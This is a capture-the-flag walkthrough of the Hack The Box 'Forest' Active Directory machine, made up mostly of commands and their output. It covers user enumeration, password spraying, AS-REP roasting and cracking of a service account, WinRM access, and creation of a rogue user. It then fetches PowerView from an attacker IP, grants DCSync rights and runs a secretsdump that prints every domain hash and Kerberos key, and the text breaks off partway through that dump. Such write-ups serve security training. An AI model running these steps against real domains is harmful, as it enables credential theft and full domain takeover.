
An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 10.129.59.98                     
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-27 14:38 -0500
Warning: 10.129.59.98 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.59.98
Host is up (0.022s latency).
Not shown: 64634 closed tcp ports (reset), 878 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-01-27 19:45:39Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49681/tcp open  msrpc        Microsoft Windows RPC
49698/tcp open  msrpc        Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 2016
OS CPE: cpe:/o:microsoft:windows_server_2016
OS details: Microsoft Windows Server 2016
Network Distance: 2 hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h46m51s, deviation: 4h37m12s, median: 6m49s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-01-27T11:46:41-08:00
| smb2-time: 
|   date: 2026-01-27T19:46:35
|_  start_date: 2026-01-27T19:40:25
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   18.10 ms 10.10.14.1
2   18.11 ms 10.129.59.98

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.81 seconds
```

We enumerated an domain called "htb.local" through LDAP. Let's map it to our target ip in our local dns file /etc/hosts.

```
sudo echo "10.129.59.98 htb.local" | sudo tee -a /etc/hosts
```

Ran ldapsearch, but couldn't retrieve anything sensitive.

```
ldapsearch -v -x -b "DC=htb,DC=local" -H "ldap://10.129.59.98" "(objectclass=*)"
ldap_initialize( ldap://10.129.59.98:389/??base )
filter: (objectclass=*)
requesting: All userApplication attributes
# extended LDIF
#
# LDAPv3
# base <DC=htb,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#
```

Let's check if we can enumerate users on kerberos.

Ran "kerbrute" tool and enumerated usernames successfully.

```
./kerbrute userenum -d htb.local --dc 10.129.59.98 /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -t 100

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/27/26 - Ronnie Flathers @ropnop

2026/01/27 15:10:42 >  Using KDC(s):
2026/01/27 15:10:42 >   10.129.59.98:88

2026/01/27 15:10:42 >  [+] VALID USERNAME:       mark@htb.local
2026/01/27 15:10:42 >  [+] VALID USERNAME:       andy@htb.local
2026/01/27 15:10:43 >  [+] VALID USERNAME:       forest@htb.local
2026/01/27 15:10:43 >  [+] VALID USERNAME:       Mark@htb.local
2026/01/27 15:10:43 >  [+] VALID USERNAME:       administrator@htb.local
2026/01/27 15:10:43 >  [+] VALID USERNAME:       Andy@htb.local
2026/01/27 15:10:44 >  [+] VALID USERNAME:       sebastien@htb.local
2026/01/27 15:10:45 >  [+] VALID USERNAME:       MARK@htb.local
2026/01/27 15:10:49 >  [+] VALID USERNAME:       Forest@htb.local
2026/01/27 15:10:50 >  [+] VALID USERNAME:       santi@htb.local
2026/01/27 15:10:51 >  [+] VALID USERNAME:       lucinda@htb.local
```

Let's create an wordlist out of these accounts in order to bruteforce potential login.

```
mark
andy
forest
administrator
sebastien
santi
lucinda
```

Didn't work with same username & password.

```
nxc smb 10.129.59.98 -u wordlist -p wordlist                  
SMB         10.129.59.98    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)                                                                                                                               
SMB         10.129.59.98    445    FOREST           [-] htb.local\mark:mark STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\andy:mark STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\forest:mark STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\administrator:mark STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\sebastien:mark STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\santi:mark STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\lucinda:mark STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\mark:andy STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\andy:andy STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\forest:andy STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\administrator:andy STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\sebastien:andy STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\santi:andy STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\lucinda:andy STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\mark:forest STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\andy:forest STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\forest:forest STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\administrator:forest STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\sebastien:forest STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\santi:forest STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\lucinda:forest STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\mark:administrator STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\andy:administrator STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\forest:administrator STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\administrator:administrator STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\sebastien:administrator STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\santi:administrator STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\lucinda:administrator STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\mark:sebastien STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\andy:sebastien STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\forest:sebastien STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\administrator:sebastien STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\sebastien:sebastien STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\santi:sebastien STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\lucinda:sebastien STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\mark:santi STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\andy:santi STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\forest:santi STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\administrator:santi STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\sebastien:santi STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\santi:santi STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\lucinda:santi STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\mark:lucinda STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\andy:lucinda STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\forest:lucinda STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\administrator:lucinda STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\sebastien:lucinda STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\santi:lucinda STATUS_LOGON_FAILURE 
SMB         10.129.59.98    445    FOREST           [-] htb.local\lucinda:lucinda STATUS_LOGON_FAILURE
```

Connected to RPC and enumerated usernames.

```
rpcclient -U''%'' 10.129.59.98
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda       Name: Lucinda Berger    Desc: (null)
index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark  Name: Mark Brandt       Desc: (null)
index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi Name: Santi Rodriguez   Desc: (null)
index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien     Name: Sebastien Caron   Desc: (null)
index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco  Name: svc-alfresco      Desc: (null)
```

We retrieved an service account called "svc-alfresco".

Enumerated RID's

```
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

Upon Inspecting specific userinformation, I realised that all those users set there password a long time ago.

```
rpcclient $> queryuser 0x47a
        User Name   :   lucinda
        Full Name   :   Lucinda Berger
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 31 Dec 1969 19:00:00 EST
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
        Password last set Time   :      Thu, 19 Sep 2019 20:44:13 EDT
        Password can change Time :      Fri, 20 Sep 2019 20:44:13 EDT
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x47a
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000007
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...
rpcclient $>
```

I wasn't able to find any passwords. So I tested if any account has the privilege set to true that no preauthentication is required. The service account we retrieved earlier seemed to have that permission, we retrieved the kerberos hash of the user. Let's try & bruteforce an password!

```
impacket-GetNPUsers -dc-ip 10.129.59.98 "htb.local/svc-alfresco" -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:3e2e2978a0fa19e2d0b971a93feb5ad8$bc1901693ac42e987d3494e95000b85ae42bb78b704ebb97586e2e3e822167cdd5a21d75ccc4652bb2ef485fdc6d9e298df393eac5f789ea90add960781cb7cf9980bbbea301024f93483c38233e9289420852cca884a6cc140534b3fd1e7468102da9a545f00c4e551ce4a9d9889b6aea4bb58d5ba766339054294057c6e0a0ef0c34451805ecdee218c0eb8bcc52b38c841f989729da9cbeb40044368519fc1775210c8c1e6800ce5199e08b57a21df62f792b4143fb321b1b425ba6615779bfd3c9082aebae77222c23091be8520bdb4fccb17cfecac2ccb45a538328431b33ecc2cc3bf7
```

We successfully bruteforced an password john the ripper. svc-alfresco:s3rvice

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt    
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:02 DONE (2026-01-27 15:55) 0.4761g/s 1945Kp/s 1945Kc/s 1945KC/s s4553592..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Enumerated SMB Shares authenticated.

```
smbclient -L \\\\htb.local -U svc-alfresco -p
Password for [WORKGROUP\svc-alfresco]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to htb.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

But I wasn't able to access any share.

Checked if user was able to login into evil-winrm --> he is!

```
evil-winrm -i 10.129.59.98 -u svc-alfresco -p s3rvice 
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```

Retrieved user.txt in C:\Users\svc-alfresco\Desktop.

```
6038b8ab010fb93922eb4ee37b710de9
```

Since this is an service account, we should have strong permissions, let's check!

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

The privileges seem to be restricted on this server, let's utilize an tool called "FullPowers.exe" in order to restore the privileges. But this had no impact!

Let's make it easy for ourselves and utilize bloodhound to get an potential privilege escalation path!

Downloaded all domain information.

```
bloodhound-python -u "svc-alfresco" -p 's3rvice' -ns 10.129.59.98 -d htb.local -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (FOREST.htb.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Testing resolved hostname connectivity dead:beef::158
INFO: Trying LDAP connection to dead:beef::158
INFO: Testing resolved hostname connectivity dead:beef::d4e6:c66f:daa2:2e42
INFO: Trying LDAP connection to dead:beef::d4e6:c66f:daa2:2e42
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Testing resolved hostname connectivity dead:beef::158
INFO: Trying LDAP connection to dead:beef::158
INFO: Testing resolved hostname connectivity dead:beef::d4e6:c66f:daa2:2e42
INFO: Trying LDAP connection to dead:beef::d4e6:c66f:daa2:2e42
INFO: Found 32 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done in 00M 09S
```

Started neo4j

```
neo4j console                                                 
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
```

Started bloodhound

```
bloodhound                      

 Starting neo4j
Neo4j is running at pid 8320

 Bloodhound will start

 IMPORTANT: It will take time, please wait...
```

Checked quickest path from "svc-alfresco" user to "Administrator" user and found out that our current service account is part of the "Account Operators" Group, which has GenericAll on "Exchange Windows Permissions" Group, which is an critical misconfiguration. Because this Group has the "WriteDacl" permission on the whole domain object. Which grants us the power to grant ourselves any permission on the domain.

Let's try and add an custom user to the "Exchange Windows Permissions" Group, so we can dump all the password hashes of users on the domain.

1. Created user "hacker" and added it to the group.

```
net user hacker password /add /domain  
net group “Exchange Windows Permissions” hacker /add
```

3. Re-login into user for the group membership to take effect. 

4. Load PowerView and set up [[DCSync]] rights.

```
iwr -iri http://10.10.4.23/PowerView.ps1 -OutFile PowerView.ps1
Import-Module .\PowerView.ps1
```

5. Setting up DCSync rights.

```
Add-DomainObjectAcl -TargetIdentity “DC=htb,DC=local” -PrincipalIdentity hacker -Rights DCSync
```

Since our created user "hacker" got DSync permissions now, we can dump all the hashes of users of the domain remotely.

```
impacket-secretsdump htb.local/hacker:password@10.129.59.98
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
hacker:10101:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:fbf3da6c1959c1507538b2da1e1002d0:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
